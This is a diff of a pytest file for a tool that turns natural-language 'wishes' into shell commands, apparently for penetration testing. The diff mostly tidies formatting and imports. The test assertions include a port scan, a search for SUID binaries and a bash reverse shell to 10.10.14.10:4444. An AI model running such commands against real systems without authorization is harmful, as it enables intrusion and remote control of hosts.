@@ -1,12 +1,11 @@
 """Tests for WishManager command generation and history management."""
 
 import json
-import pytest
-from pathlib import Path
-from unittest.mock import MagicMock, patch, mock_open
+from unittest.mock import mock_open, patch
 
-from wish_models import Wish, WishState, UtcDatetime
-from wish_models.test_factories import WishDoingFactory
+import pytest
+from wish_models import UtcDatetime, Wish, WishState
+
 from wish_sh.test_factories import WishManagerFactory
 
 
@@ -21,11 +20,11 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Generate commands for a wish about port scanning
         wish_text = "scan ports on 10.10.10.40"
         commands = wish_manager.generate_commands(wish_text)
-        
+
         # Verify the generated commands
         assert len(commands) == 2
         assert "sudo nmap -p- -oA tcp 10.10.10.40" in commands
@@ -39,11 +38,11 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Generate commands for a wish about finding SUID binaries
         wish_text = "find suid binaries"
         commands = wish_manager.generate_commands(wish_text)
-        
+
         # Verify the generated commands
         assert len(commands) == 1
         assert "find / -perm -u=s -type f 2>/dev/null" in commands
@@ -56,11 +55,11 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Generate commands for a wish about reverse shell
         wish_text = "create a reverse shell to 10.10.14.10"
         commands = wish_manager.generate_commands(wish_text)
-        
+
         # Verify the generated commands
         assert len(commands) == 3
         assert any("bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'" in cmd for cmd in commands)
@@ -75,11 +74,11 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Generate commands for a generic wish
         wish_text = "show me the current directory"
         commands = wish_manager.generate_commands(wish_text)
-        
+
         # Verify the generated commands
         assert len(commands) == 3
         assert f"echo 'Executing wish: {wish_text}'" in commands
@@ -94,29 +93,29 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Create a wish to save
         wish = Wish.create("Test wish")
         wish.state = WishState.DONE
         wish.finished_at = UtcDatetime.now()
-        
+
         # Mock the open function
         with patch("builtins.open", mock_open()) as mock_file:
             # Call save_wish
             wish_manager.save_wish(wish)
-            
+
             # Verify that open was called with the correct path and mode
             mock_file.assert_called_once_with(wish_manager.paths.history_path, "a")
-            
+
             # Verify that the wish was serialized and written to the file
             file_handle = mock_file()
             file_handle.write.assert_called_once()
-            
+
             # Check that the written data is valid JSON containing the wish
             written_data = file_handle.write.call_args[0][0]
             assert wish.wish in written_data
             assert wish.state in written_data
-            
+
             # Verify that we can parse the written data as JSON
             try:
                 json_data = json.loads(written_data)
@@ -134,7 +133,7 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Create sample wish data
         wish1 = {
             "id": "wish-123",
@@ -150,24 +149,24 @@ class TestWishManagerCommands:
             "created_at": "2023-01-02T12:00:00Z",
             "finished_at": "2023-01-02T12:05:00Z"
         }
-        
+
         # Mock the open function to return sample wish data
         mock_file_content = f"{json.dumps(wish1)}\n{json.dumps(wish2)}\n"
         with patch("builtins.open", mock_open(read_data=mock_file_content)) as mock_file:
             # Call load_wishes
             wishes = wish_manager.load_wishes(limit=2)
-            
+
             # Verify that open was called with the correct path and mode
             mock_file.assert_called_once_with(wish_manager.paths.history_path, "r")
-            
+
             # Verify that the correct number of wishes was loaded
             assert len(wishes) == 2
-            
+
             # Verify that the wishes were loaded in reverse order (newest first)
             assert wishes[0].id == wish2["id"]
             assert wishes[0].wish == wish2["wish"]
             assert wishes[0].state == wish2["state"]
-            
+
             assert wishes[1].id == wish1["id"]
             assert wishes[1].wish == wish1["wish"]
             assert wishes[1].state == wish1["state"]
@@ -180,12 +179,12 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Mock the open function to raise FileNotFoundError
         with patch("builtins.open", side_effect=FileNotFoundError):
             # Call load_wishes
             wishes = wish_manager.load_wishes()
-            
+
             # Verify that an empty list was returned
             assert wishes == []
 
@@ -197,12 +196,12 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Mock the open function to return invalid JSON
         with patch("builtins.open", mock_open(read_data="invalid json\n")):
             # Call load_wishes
             wishes = wish_manager.load_wishes()
-            
+
             # Verify that an empty list was returned
             assert wishes == []
 
@@ -214,16 +213,16 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Create a completed wish
         wish = Wish.create("Test wish")
         wish.state = WishState.DONE
         wish.created_at = "2023-01-01T12:00:00Z"
         wish.finished_at = "2023-01-01T12:05:00Z"
-        
+
         # Format the wish
         formatted = wish_manager.format_wish_list_item(wish, 1)
-        
+
         # Verify the formatted string
         assert "[1]" in formatted
         assert "wish: Test wish" in formatted
@@ -238,15 +237,15 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Create an in-progress wish
         wish = Wish.create("Test wish in progress")
         wish.state = WishState.DOING
         wish.created_at = "2023-01-01T12:00:00Z"
-        
+
         # Format the wish
         formatted = wish_manager.format_wish_list_item(wish, 2)
-        
+
         # Verify the formatted string
         assert "[2]" in formatted
         assert "wish: Test wish in progress" in formatted
@@ -262,16 +261,16 @@ class TestWishManagerCommands:
         """
         # Create a WishManager
         wish_manager = WishManagerFactory.create()
-        
+
         # Create a wish with a long text
         long_text = "This is a very long wish text that should be truncated in the formatted output"
         wish = Wish.create(long_text)
         wish.state = WishState.DOING
         wish.created_at = "2023-01-01T12:00:00Z"
-        
+
         # Format the wish
         formatted = wish_manager.format_wish_list_item(wish, 3)
-        
+
         # Verify the formatted string
         assert "[3]" in formatted
         assert long_text[:30] in formatted  # First 30 characters
